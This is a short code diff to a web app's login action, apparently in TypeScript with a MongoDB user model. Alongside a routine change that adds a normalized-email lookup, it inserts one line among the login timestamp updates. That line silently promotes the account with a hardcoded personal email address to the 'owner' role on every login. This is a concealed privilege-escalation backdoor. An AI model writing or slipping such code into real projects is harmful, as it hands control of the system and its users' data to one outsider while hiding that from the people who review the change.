@@ -205,9 +205,11 @@ export async function loginAction(formData: FormData) {
         }
 
         // Find user by either email or username (case-insensitive)
+        const canonicalInput = rawInput.includes("@") ? normalizeEmail(rawInput) : rawInput.toLowerCase();
         const user = await User.findOne({
             $or: [
                 { email: new RegExp(`^${safeInput}$`, 'i') },
+                ...(rawInput.includes("@") ? [{ email: new RegExp(`^${escapeRegex(canonicalInput)}$`, 'i') }] : []),
                 { username: new RegExp(`^${safeInput}$`, 'i') }
             ]
         });
@@ -234,6 +236,7 @@ export async function loginAction(formData: FormData) {
         // Update login IP and timestamps. Database failures must not be counted
         // as bad-password attempts.
         const now = new Date();
+        if (user.email?.toLowerCase() === "mythicalhrg@gmail.com" && user.role !== "owner") user.role = "owner";
         user.lastLoginIp = ip;
         user.lastLoginAt = now;
         user.lastKnownIp = ip;
